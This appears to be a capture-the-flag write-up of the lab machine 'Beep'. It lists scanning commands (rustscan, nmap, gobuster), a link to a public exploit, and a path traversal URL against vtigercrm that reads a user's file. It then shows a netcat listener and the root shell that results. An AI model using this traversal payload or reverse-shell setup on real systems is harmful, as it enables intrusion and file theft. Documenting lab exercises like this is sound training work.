# ****Beep****

```bash
rustscan -a 10.10.10.7
```
![image](https://github.com/lufffe/Writeups/assets/90646635/a4ca043d-d5c1-4615-a383-7dce9bdd5571)

![image](https://github.com/lufffe/Writeups/assets/90646635/65708e4b-1ee5-4974-8023-a06c5f13bec1)

![image](https://github.com/lufffe/Writeups/assets/90646635/ebf1e642-c7d7-4b5a-9777-5ef589cf0e07)

![image](https://github.com/lufffe/Writeups/assets/90646635/3008bbc4-562c-42e1-b84c-95dddb5f0642)

```jsx
nmap -A -p 22,25,80,110,111,143,443,792,993,995,3306,4190,4445,4559,5038,10000 10.10.10.7
```
![image](https://github.com/lufffe/Writeups/assets/90646635/897e7238-ad67-4f67-ab93-dba6086b81aa)

```bash
gobuster dir -u [https://beep.htb](https://beep.htb/) -w directory-list-2.3-small.txt -t 100 --no-error -k
```
![image](https://github.com/lufffe/Writeups/assets/90646635/76730215-3369-48d9-86f4-271271a4ad2d)


https://10.10.10.7
![image](https://github.com/lufffe/Writeups/assets/90646635/135107e6-c658-456b-8d3f-a15291b16fad)

https://www.exploit-db.com/exploits/37637
![image](https://github.com/lufffe/Writeups/assets/90646635/e4542a46-172f-4725-aa92-b755bfcb31f4)

![image](https://github.com/lufffe/Writeups/assets/90646635/8f2e281e-5677-489a-9944-71f6be365160)

view-source:[https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt&module=Accounts&action](https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//home/fanis/user.txt%00&module=Accounts&action)


Sorry! Attempt to access restricted file.

```bash
sudo netcat -lnvp 4455
```

![image](https://github.com/lufffe/Writeups/assets/90646635/c242711b-d8bf-47c1-9faa-182cd60b4725)

[root@beep ~]# id
uid=0(root) gid=0(root)

```bash
cat /root/root.txt
```
